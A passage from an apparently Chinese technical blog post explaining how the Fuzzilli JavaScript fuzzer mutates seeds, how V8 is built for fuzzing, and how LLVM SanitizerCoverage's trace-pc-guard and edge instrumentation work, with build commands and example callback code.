&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现两点：</p><ul><li>随机从corpus中选取一个种子，如果该种子变异后执行成功，那么就会继续变异该种子<code>numConsecutiveMutations</code>次。即每次成功变异成功执行后，在现在的基础上再继续变异。</li><li>对一个种子变异时，会尝试<code>maxAttempts</code>次，直到成功一次为止，如果每次都失败则会抛弃该样本</li></ul><p><code>execute()</code>方法定义在<code>FuzzEngine</code>中，是所有fuzz引擎的公共方法。</p><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/676661723">fuzzilli原理：基本架构</a></p><h3 id="覆盖率：由编译开始"><a href="#覆盖率：由编译开始" class="headerlink" title="覆盖率：由编译开始"></a>覆盖率：由编译开始</h3><h4 id="下载并构建V8引擎"><a href="#下载并构建V8引擎" class="headerlink" title="下载并构建V8引擎"></a>下载并构建V8引擎</h4><p><code>v8</code>使用名为<code>depot_tools</code>的脚本包来管理。</p><p><code>depot_tools</code>包括<code>gclient</code>，<code>gcl</code>，<code>git-cl</code>，<code>repo</code>等。可以通过以下方式安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=`pwd`/depot_tools:<span class="hljs-variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc<br><span class="hljs-built_in">source</span>  ~/.bashrc<br></code></pre></td></tr></table></figure><p>随后，通过fetch获取v8源码。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">cd</span> fuzzilli/Targets/<span class="hljs-built_in">V8</span><br><span class="hljs-symbol">fetch</span> <span class="hljs-built_in">v8</span><br><span class="hljs-symbol">cd</span> <span class="hljs-built_in">v8</span><br><span class="hljs-symbol">git</span> checkout origin<br><span class="hljs-symbol">gclient</span> sync<br></code></pre></td></tr></table></figure><p>接下来构建和测试v8引擎，首先是安装构建依赖项。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">./<span class="hljs-keyword">build</span>/install-<span class="hljs-keyword">build</span>-deps.sh<br></code></pre></td></tr></table></figure><p>再使用gn生成构建文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">gn gen <span class="hljs-keyword">out</span><span class="hljs-operator">/</span><span class="hljs-keyword">Release</span> &quot;--args=is_debug=false&quot;<br></code></pre></td></tr></table></figure><p>使用以下命令进行编译，编译成功后会在<code>out/Release</code>目录下生成可执行文件d8</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">ninja</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">out</span><span class="hljs-operator">/</span><span class="hljs-built_in">Release</span><br></code></pre></td></tr></table></figure><p>测试一下d8是正常的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/out/</span>Release<span class="hljs-regexp">/d8 ./</span>test<span class="hljs-regexp">/fuzzer/</span>parser/hello-world<br></code></pre></td></tr></table></figure><p>完事儿后再用脚本编译v8即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> fuzzilli/Targets/V8/v8<br>../fuzzbuild.sh<br></code></pre></td></tr></table></figure><p>编译成功后，会生成<code>./out/fuzzbuild/d8</code>文件，这就是目标文件，也就是v8的js shell。</p><h4 id="编译脚本参数分析"><a href="#编译脚本参数分析" class="headerlink" title="编译脚本参数分析"></a>编译脚本参数分析</h4><p>再简要分析编译过程，以下是fuzzilli编译V8的脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(uname)</span>&quot;</span> == <span class="hljs-string">&quot;Linux&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-comment"># See https://v8.dev/docs/compile-arm64 for instructions on how to build on Arm64</span><br>    gn gen out/fuzzbuild --args=<span class="hljs-string">&#x27;is_debug=false dcheck_always_on=true v8_static_library=true v8_enable_verify_heap=true v8_fuzzilli=true sanitizer_coverage_flags=&quot;trace-pc-guard&quot; target_cpu=&quot;x64&quot;&#x27;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unsupported operating system&quot;</span><br><span class="hljs-keyword">fi</span><br><br>ninja -C ./out/fuzzbuild d8<br></code></pre></td></tr></table></figure><ul><li><code>gn gen</code>：使用GN(Generate Ninja)生成构建文件</li><li><code>out/fuzzbuild</code>：构建输出目录</li><li><code>--args</code>：构建参数配置：<ul><li><code>is_debug=false</code>：构建发布版本（非调试版本）</li><li><code>dcheck_always_on=true</code>：始终启用调试检查</li><li><code>v8_static_library=true</code>：构建静态库版本的V8</li><li><code>v8_enable_verify_heap</code>：启用堆验证</li><li><code>v8_fuzzilli=true</code>：启用Fuzzilli特定支持</li><li><code>sanitizer_coverage_flags=&quot;trace-pc-guard&quot;</code>：设置代码覆盖率检测</li><li><code>target_cpu=&quot;x64&quot;</code>：指定目标CPU架构为x86-64</li></ul></li></ul><p>最后的<code>ninjia -C ./out/fuzzbuild d8</code>指的是在指定目录进行构建，而<code>d8</code>表示构建目标为V8的开发者shell</p><p>重点关注：<code>v8_fuzzilli=true</code>和<code>sanitizer_coverage_flags=&quot;trace-pc-guard&quot;</code>参数</p><h5 id="v8-fuzzilli-true"><a href="#v8-fuzzilli-true" class="headerlink" title="v8_fuzzilli&#x3D;true"></a>v8_fuzzilli&#x3D;true</h5><p>当设置这个参数时，<code>BUILD.gn</code>会添加一个<code>V8_FUZZILLI</code>宏</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (v8_fuzzilli) &#123;<br>    <span class="hljs-attribute">defines</span> += [ <span class="hljs-string">&quot;V8_FUZZILLI&quot;</span> ]<br>&#125;<br></code></pre></td></tr></table></figure><p>并且在编译时额外添加如下4个文件，这四个文件用于llvm覆盖率插桩函数</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (v8_fuzzilli) &#123;<br>  <span class="hljs-attribute">sources</span> += [<br>    <span class="hljs-string">&quot;src/fuzzilli/cov.cc&quot;</span>,<br>    <span class="hljs-string">&quot;src/fuzzilli/cov.h&quot;</span>,<br>    <span class="hljs-string">&quot;src/fuzzilli/fuzzilli.cc&quot;</span>,<br>    <span class="hljs-string">&quot;src/fuzzilli/fuzzilli.h&quot;</span>,<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sanitizer-coverage-flags"><a href="#sanitizer-coverage-flags" class="headerlink" title="sanitizer_coverage_flags"></a>sanitizer_coverage_flags</h5><blockquote><p><code>.gni</code>后缀的文件是<strong>GN Build 系统的构建配置文件</strong>，通常用于**GN(Generage Ninja)**工具链。</p><ul><li>GN是一个由Google开发的元构建系统，用于生成Ninja构建文件（<code>build.ninja</code>）。</li><li><code>.gni</code>文件类似于<code>Makefile</code>或<code>CMakeLists.txt</code>，但语法更简洁，专为高性能构建涉及。</li></ul><p><code>.gni</code>文件的作用</p><ul><li>定义变量、模板和构建规则</li><li>被主<code>BUILD.gn</code>文件引用，用于模块化配置</li><li>在以下使用过程中，用来控制编译过程</li></ul></blockquote><p>根据文件<code>V8/v8/build/config/sanitizers/sanitizers.gni</code>中的描述：</p><ul><li>设置<code>sanitizer_coverage_flags</code>会用作<code>-fsanitize-coverage</code>的值</li><li>并且设置该标志会自动启用<code>use_sanitizer_coverage</code></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Value for -fsanitize-coverage flag. Setting this causes </span><br><span class="hljs-comment"># use_sanitizer_coverage to be enabled.设置它会使use_sanitizer_coverage被启用。</span><br><span class="hljs-comment"># This flag is not used for libFuzzer (use_libfuzzer=true). Instead, we use:</span><br><span class="hljs-comment">#     -fsanitize=fuzzer-no-link这个标志不用于libFuzzer。相反，我们使用：-fsanitize=fuzz-no-link</span><br><span class="hljs-comment"># Default value when unset and use_fuzzing_engine=true:</span><br><span class="hljs-comment">#     trace-pc-guard未设置且use_fuzzing_engine时的默认值：trace-pc-guard</span><br><span class="hljs-comment"># Default value when unset and use_sanitizer_coverage=true:</span><br><span class="hljs-comment">#     trace-pc-guard,indirect-calls</span><br><span class="hljs-comment"># 未设置且use_sanitizer_coverage=true时的默认值：trace-pc-guard，indirect-calls</span><br><span class="hljs-attr">sanitizer_coverage_flags</span> = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>由于它会自动启用<code>use_sanitizer_coverage</code>，所以看看启用该参数的时候编译时会发生什么：</p><p>来到<code>V8/v8/build/config/sanitizers/BUILD.gn</code>，这个文件会引用<code>sanitizers.gni</code>文件来模块化配置。查看<code>use_sanitizer_coverage</code>部分：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs prolog">config(<span class="hljs-string">&quot;coverage_flags&quot;</span>) &#123;<br>  cflags = []<br>  if (use_sanitizer_coverage) &#123;<br>    # <span class="hljs-symbol">Used</span> by sandboxing code to allow coverage dump to be written on the disk.<br>    defines = [ <span class="hljs-string">&quot;SANITIZER_COVERAGE&quot;</span> ]<br><br>    if (use_libfuzzer) &#123;<br>    ...<br>    &#125; else &#123;<br>      cflags += [<br>        <span class="hljs-string">&quot;-fsanitize-coverage=$sanitizer_coverage_flags&quot;</span>,<br>        <span class="hljs-string">&quot;-mllvm&quot;</span>,<br>        <span class="hljs-string">&quot;-sanitizer-coverage-prune-blocks=1&quot;</span>,<br>      ]<br>      if (current_cpu == <span class="hljs-string">&quot;arm&quot;</span>) &#123;<br>      ...<br>      &#125;<br>    &#125;<br>    ...<br>  &#125;<br>  if (use_centipede) &#123;<br>  ...<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参数有三个：<code>-fsanitize-coverage</code>、<code>-mllvm</code>和<code>-sanitizer-coverage-prune-blocks</code>，分别表示：</p><ul><li><code>-fsanitize-coverage</code>与llvm覆盖率检测相关，后续会详细研究</li><li><code>-mllvm</code>表示把后面一个参数传递给LLVM</li><li><code>-sanitizer-coverage-prune-blocks</code>表示在编译时对basic block进行精简，删除不会被执行到的基本块，可以提高运行速度，缺点是可能会影响代码覆盖率的准确性</li></ul><h4 id="llvm的sanitizer-coverage"><a href="#llvm的sanitizer-coverage" class="headerlink" title="llvm的sanitizer coverage"></a>llvm的sanitizer coverage</h4><h5 id="桩回调函数"><a href="#桩回调函数" class="headerlink" title="桩回调函数"></a>桩回调函数</h5><p><code>-fsanitize-coverage=$sanitizer_coverage_flags</code>表示启用llvm内置的覆盖率检测，并且可以提供覆盖率报告和可视化。<a href="https://clang.llvm.org/docs/SanitizerCoverage.html">llvm-SanitizerCoverage-官方文档</a></p><p>支持如下模式的覆盖率追踪，不同模式会调用不同的回调(call back)函数。</p><h6 id="trace-pc-guard"><a href="#trace-pc-guard" class="headerlink" title="trace-pc-guard"></a>trace-pc-guard</h6><p>该模式下编译器会在每一个edge插入如下代码</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__sanitizer_cov_trace_pc_guard</span>(&amp;<span class="hljs-variable">guard_variable</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p><code>guard_variable</code>是一个32位无符号整数，它唯一标识一条边或者一个基本块，即每个<code>guard_variable</code>对应一个特定的代码路径。在执行过程中，SanitizerCoverage运行时可以通过修改<code>guard_variable</code>的值来标记该路径是否被执行过。</p></blockquote><p>每条边都有自己的<code>guard_variable (uint32_t)</code>。编译器也会在每一个模块的构造函数中插入如下调用</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// The guards are [start, stop). 它的执行区间是[start, stop)，也就是stop地址处是不会被初始化的</span><br><span class="hljs-comment">// This function will be called at least once per DSO and may be called</span><br><span class="hljs-comment">// more than once with the same values of start/stop.</span><br><span class="hljs-comment">// 该函数将在每个DSO(动态库)中至少调用一次，并且可以使用相同的start/stop值多次调用。</span><br>__sanitizer_cov_trace_pc_guard_init(<span class="hljs-type">uint32_t</span> *start, <span class="hljs-type">uint32_t</span> *stop);<br></code></pre></td></tr></table></figure><blockquote><p>编译器会在每个模块（如共享库或可执行文件）的构造函数中插入<code>__sanitizer_cov_trace_pc_guard_init</code>；这个函数的目的是初始化所有的<code>guard_variable </code>，其参数的含义是：</p><ul><li><code>start</code>：指向该模块所有<code>guard_variable</code>数组的起始地址</li><li><code>stop</code>：指向该模块所有<code>guard_variable</code>数组的结束地址（即最后一个元素的下一个位置）</li></ul></blockquote><p>整个插装过程涉及到三部分</p><ul><li><code>guard section</code>：每一个二进制文件都会有一个guard section， guard section实际就是一个<code>uint32_t</code>组成的数组</li><li>在该二进制文件初始化时回调模块初始化函数触发，<code>__sanitizer_cov_trace_pc_guard_init(start, stop)</code>，<code>[start, stop)</code>就对应guard section的开始与结束</li><li>执行时，每一个边对应guard section中一个slot（一条边对应guard section数组的一个索引），会触发<code>__sanitizer_cov_trace_pc_guard(&amp;guard_variable)</code>，从而得知某条边被执行到了，并通过guard进行统计</li></ul><p>至此，可以修改这两个函数的实现可以让用户达到：</p><ul><li>控制每一个edge的guard的生成方式（<code>__sanitizer_cov_trace_pc_guard_init</code>）</li><li>控制每一个边被触发后的处理方式（<code>__sanitizer_cov_trace_pc_guard</code>）</li></ul><p>函数<code>__sanitizer_cov_trace_pc_*</code>可以被用户自定义，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// trace-pc-guard-cb.cc</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sanitizer/coverage_interface.h&gt;</span></span><br><br><span class="hljs-comment">// This callback is inserted by the compiler as a module constructor</span><br><span class="hljs-comment">// into every DSO. &#x27;start&#x27; and &#x27;stop&#x27; correspond to the</span><br><span class="hljs-comment">// beginning and end of the section with the guards for the entire</span><br><span class="hljs-comment">// binary (executable or DSO). The callback will be called at least</span><br><span class="hljs-comment">// once per DSO and may be called multiple times with the same parameters.</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这个回调会被编译器作为一个模块构造函数插入到每一个DSO中</span><br><span class="hljs-comment">start和stop对应整个二进制文件(可执行文件 or 动态库)中guard段的开始和结束</span><br><span class="hljs-comment">每一个动态库这个callback至少被调用一次, 并且有可能以相同的参数调用多次</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="hljs-type">uint32_t</span> *start,<br>                                                    <span class="hljs-type">uint32_t</span> *stop) &#123;<br>  <span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> N;  <span class="hljs-comment">// Counter for the guards.</span><br>  <span class="hljs-keyword">if</span> (start == stop || *start) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// Initialize only once. 只初始化一次</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INIT: %p %p\n&quot;</span>, start, stop);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> *x = start; x &lt; stop; x++)<br>    *x = ++N;  <span class="hljs-comment">// Guards should start from 1. 给[start, stop)中的guard_variable赋值，从1开始。</span><br>&#125;<br><br><span class="hljs-comment">// This callback is inserted by the compiler on every edge in the</span><br><span class="hljs-comment">// control flow (some optimizations apply).</span><br><span class="hljs-comment">// Typically, the compiler will emit the code like this:</span><br><span class="hljs-comment">//    if(*guard)</span><br><span class="hljs-comment">//      __sanitizer_cov_trace_pc_guard(guard);</span><br><span class="hljs-comment">// But for large functions it will emit a simple call:</span><br><span class="hljs-comment">//    __sanitizer_cov_trace_pc_guard(guard);</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这个回调函数会被编译器插入到控制流的每一个边中</span><br><span class="hljs-comment">通常来说编译器会生成如下代码</span><br><span class="hljs-comment">if(*guard)</span><br><span class="hljs-comment">            __sanitizer_cov_trace_pc_guard(guard);</span><br><span class="hljs-comment">    但是对于某些大函数会生成一个简单的调用, 所以callbak内部需要进行二次检查</span><br><span class="hljs-comment">     __sanitizer_cov_trace_pc_guard(guard);</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __sanitizer_cov_trace_pc_guard(<span class="hljs-type">uint32_t</span> *guard) &#123;<br>  <span class="hljs-keyword">if</span> (!*guard) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// Duplicate the guard check.</span><br>  <span class="hljs-comment">// If you set *guard to 0 this code will not be called again for this edge.</span><br>  <span class="hljs-comment">// Now you can get the PC and do whatever you want:</span><br>  <span class="hljs-comment">//   store it somewhere or symbolize it and print right away.</span><br>  <span class="hljs-comment">// The values of `*guard` are as you set them in</span><br>  <span class="hljs-comment">// __sanitizer_cov_trace_pc_guard_init and so you can make them consecutive</span><br>  <span class="hljs-comment">// and use them to dereference an array or a bit vector.</span><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  如果设置*guard为0, 那么对于这个边该代码就不会被调用了。</span><br><span class="hljs-comment">  现在你可以得到PC并做任何你想做的事情：将它存储在某个地方或将其标记并立即打印。</span><br><span class="hljs-comment">  *guard就是之前__sanitizer_cov_trace_pc_guard_init()中设置的值</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-type">void</span> *PC = __builtin_return_address(<span class="hljs-number">0</span>);<br>  <span class="hljs-type">char</span> PcDescr[<span class="hljs-number">1024</span>];<br>  <span class="hljs-comment">// This function is a part of the sanitizer run-time.</span><br>  <span class="hljs-comment">// To use it, link with AddressSanitizer or other sanitizer.</span><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  这是sanitizer run-time函数的一部分, 可以获取pc相关信息</span><br><span class="hljs-comment">  为了使用它需要与AddressSanitizer或者其他sanitizer链接到一起</span><br><span class="hljs-comment">  */</span><br>  __sanitizer_symbolize_pc(PC, <span class="hljs-string">&quot;%p %F %L&quot;</span>, PcDescr, <span class="hljs-keyword">sizeof</span>(PcDescr));<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;guard: %p %x PC %s\n&quot;</span>, guard, *guard, PcDescr);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是被插桩的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// trace-pc-guard-example.cc</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123; &#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">1</span>) foo();<br>&#125;<br></code></pre></td></tr></table></figure><p>执行编译命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 编译example.cc, 会为每个边生成guard并插入对于__sanitizer_cov_trace_pc*()的调用</span><br>clang++ -g  <span class="hljs-attribute">-fsanitize-coverage</span>=trace-pc-guard trace-pc-guard-example.cc -c<br><br><span class="hljs-comment"># 链接, 获取__sanitizer_cov_trace_pc*()的实现</span><br>clang++ trace-pc-guard-cb.cc trace-pc-guard-example.o <span class="hljs-attribute">-fsanitize</span>=address<br><br><span class="hljs-comment"># 执行</span><br><span class="hljs-attribute">ASAN_OPTIONS</span>=strip_path_prefix=`pwd`/ ./a.out<br></code></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INIT</span>: <span class="hljs-number">0</span>x71bcd0 <span class="hljs-number">0</span>x71bce0<br><span class="hljs-attribute">guard</span>: <span class="hljs-number">0</span>x71bcd4 <span class="hljs-number">2</span> PC <span class="hljs-number">0</span>x4ecd5b in main trace-pc-guard-example.cc:<span class="hljs-number">2</span><br><span class="hljs-attribute">guard</span>: <span class="hljs-number">0</span>x71bcd8 <span class="hljs-number">3</span> PC <span class="hljs-number">0</span>x4ecd9e in main trace-pc-guard-example.cc:<span class="hljs-number">3</span>:<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>执行（带参数）：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">A<span class="hljs-attr">SAN_OPTIONS</span><span class="hljs-operator">=</span>strip_path_prefix<span class="hljs-operator">=</span>`pwd`<span class="hljs-symbol">/</span> <span class="hljs-symbol">./a.out</span> <span class="hljs-keyword">with</span>-foo<br></code></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INIT</span>: <span class="hljs-number">0</span>x71bcd0 <span class="hljs-number">0</span>x71bce0<br><span class="hljs-attribute">guard</span>: <span class="hljs-number">0</span>x71bcd4 <span class="hljs-number">2</span> PC <span class="hljs-number">0</span>x4ecd5b in main trace-pc-guard-example.cc:<span class="hljs-number">3</span><br><span class="hljs-attribute">guard</span>: <span class="hljs-number">0</span>x71bcdc <span class="hljs-number">4</span> PC <span class="hljs-number">0</span>x4ecdc7 in main trace-pc-guard-example.cc:<span class="hljs-number">4</span>:<span class="hljs-number">17</span><br><span class="hljs-attribute">guard</span>: <span class="hljs-number">0</span>x71bcd0 <span class="hljs-number">1</span> PC <span class="hljs-number">0</span>x4ecd20 in foo() trace-pc-guard-example.cc:<span class="hljs-number">2</span>:<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><h6 id="Inline-8bit-counters"><a href="#Inline-8bit-counters" class="headerlink" title="Inline 8bit-counters"></a>Inline 8bit-counters</h6><p><code>-fsanitize-coverage=inline-8bit-counters</code>将在每个edge插入内联计数器增量。这同上面的插装类似，但是只检测不回调处理。用户需要实现一个函数来在启动时捕获计数器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-type">void</span> __sanitizer_cov_8bit_counters_init(<span class="hljs-type">char</span> *start, <span class="hljs-type">char</span> *end) &#123;<br>  <span class="hljs-comment">// [start,end) is the array of 8-bit counters created for the current DSO.</span><br>  <span class="hljs-comment">// Capture this array in order to read/modify the counters.</span><br>  <span class="hljs-comment">// [start，end]是为当前DSO创建的8位计数器数组。捕获该数组以便读取/修改计数器。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其余的就不看了，对当前而言意义不大。</p><h5 id="插桩方式"><a href="#插桩方式" class="headerlink" title="插桩方式"></a>插桩方式</h5><p>sanitizer coverage提供不同程度的插桩</p><ul><li>edge：对控制流的边插桩</li><li>bb：对基本块插桩</li><li>func：对函数入口处插桩</li></ul><p>用它的方法也很简单：将其和<code>trace-pc</code>或<code>trace-pc-guard</code>一起用，例如：<code>-fsanitize-coverage=func,trace-pc-guard</code>，那么就会使用函数级插桩，回调函数用的是<code>trace-pc-guard</code></p><blockquote><p>当使用edge或者bb时, 如果有些插桩被认为是冗余的, 那么就会进行精简, 所以有些edge或者block可能没有被插桩, 可以使用<code>no-prune</code>标志来禁止精简, 比如<code>-fsanitize-coverage=bb,no-prune,trace-pc-guard</code></p></blockquote><h6 id="Edge-coverage"><a href="#Edge-coverage" class="headerlink" title="Edge coverage"></a>Edge coverage</h6><p>对于代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">int</span> *a)</span> &#123;<br>  <span class="hljs-keyword">if</span> (a)<br>    *a = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>包含三个基本块（很容易判断，if前的语句，满足条件的语句，不满足条件的语句构成三个基本块）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">A<br><span class="hljs-string">|\</span><br><span class="hljs-string">| \</span><br><span class="hljs-string">|  B</span><br><span class="hljs-string">| /</span><br><span class="hljs-string">|/</span><br>C<br></code></pre></td></tr></table></figure><p>如果三个块都被覆盖了, 那么就可以确定<code>A=&gt;B</code>和<code>B=&gt;C</code>这两个边被执行了, 但是我们无法得知<code>A=&gt;C</code>是否执行. CFG中这样的edge被称为关键边 critical edge. edge-level的覆盖率会通过引入新的dummy block分割所有的critical edge, 然后插桩这些block:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">A<br><span class="hljs-string">|\</span><br><span class="hljs-string">| \</span><br>D  B<br><span class="hljs-string">| 